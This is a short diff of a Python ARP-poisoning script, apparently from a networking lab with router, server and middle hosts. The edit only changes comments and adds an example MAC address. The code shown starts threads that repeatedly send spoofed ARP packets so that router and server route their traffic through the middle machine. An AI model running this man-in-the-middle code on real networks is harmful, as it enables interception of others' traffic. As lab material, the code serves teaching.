@@ -11,7 +11,7 @@ def init():
     router_ip = resolve(ROUTER)
     server_ip = resolve(SERVER)
     iface = conf.iface
-    mac = get_if_hwaddr(iface)
+    mac = get_if_hwaddr(iface) #Ex: "08:00:27:53:8b:dc"
     print(f"[i] router_ip={router_ip} server_ip={server_ip} middle_mac={mac} iface={iface}")
     return router_ip, server_ip, mac
 
@@ -23,9 +23,9 @@ def poison(psrc, pdst):
         send(pkt, verbose=False)
         time.sleep(2)
 
-# Router crede că server are MAC middle
+# Router -> server = MAC middle
 threading.Thread(target=poison, args=(server_ip, router_ip), daemon=True).start()
-# Server crede că router are MAC middle
+# Server -> router = MAC middle
 threading.Thread(target=poison, args=(router_ip, server_ip), daemon=True).start()
 
 print("[i] ARP poisoning running...")
